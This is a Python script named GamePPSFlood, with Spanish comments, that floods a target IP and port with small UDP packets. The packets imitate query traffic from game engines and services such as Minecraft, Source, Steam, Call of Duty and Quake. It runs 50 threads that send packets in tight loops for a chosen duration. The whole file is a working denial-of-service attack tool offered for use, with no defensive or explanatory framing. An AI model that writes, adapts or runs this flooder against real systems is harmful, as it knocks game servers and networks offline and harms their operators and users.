import socket
import random
import sys
import time
import threading
import os

class GamePPSFlood:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.game_packets = self.generate_game_packets()
        
    def generate_game_packets(self):
        packets = []
        
        # Packets pequeños de juegos (máximos PPS)
        # Minecraft
        for _ in range(20):
            packets.append(b'\xFE\xFD\x09\x00\x00\x00\x00')
            packets.append(b'\x01\x00\x00\x00\x00')
            packets.append(b'\x00\x00\x00\x00')
        
        # Source
        for _ in range(20):
            packets.append(b'\xFF\xFF\xFF\xFF\x54')
            packets.append(b'\xFF\xFF\xFF\xFF\x55')
            packets.append(b'\xFF\xFF\xFF\xFF\x56')
        
        # Steam
        for _ in range(20):
            packets.append(b'\x00\x00\x00\x00')
            packets.append(b'\x01\x00\x00\x00')
        
        # Call of Duty
        for _ in range(20):
            packets.append(b'\xFF\xFF\xFF\xFF\x67')
            packets.append(b'\xFF\xFF\xFF\xFF\x69')
        
        # Quake
        for _ in range(20):
            packets.append(b'\xFF\xFF\xFF\xFF\x73')
        
        # Unreal
        for _ in range(20):
            packets.append(b'\x00\x00\x00\x00\x00')
        
        # Packets ultra pequeños (1-4 bytes)
        for _ in range(50):
            packets.append(b'\x00')
            packets.append(b'\x01')
            packets.append(b'\xFF')
            packets.append(b'\x00\x00')
            packets.append(b'\xFF\xFF')
            packets.append(b'\x00\x00\x00')
            packets.append(b'\x01\x00\x00')
        
        return packets
    
    def udp_pps_worker(self, worker_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        
        end = time.time() + self.duration
        local_packets = self.game_packets * 5
        
        while time.time() < end and self.running:
            try:
                for _ in range(5000):
                    p = random.choice(local_packets)
                    sock.sendto(p, (self.target_ip, self.target_port))
            except:
                sock.close()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        
        sock.close()
    
    def start(self):
        threads = []
        n = 50  # 50 threads para máximo PPS
        
        for i in range(n):
            t = threading.Thread(target=self.udp_pps_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(self.duration)
        self.running = False

def main():
    if len(sys.argv) != 4:
        sys.exit(1)
    
    f = GamePPSFlood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    f.start()

if __name__ == "__main__":
    main()
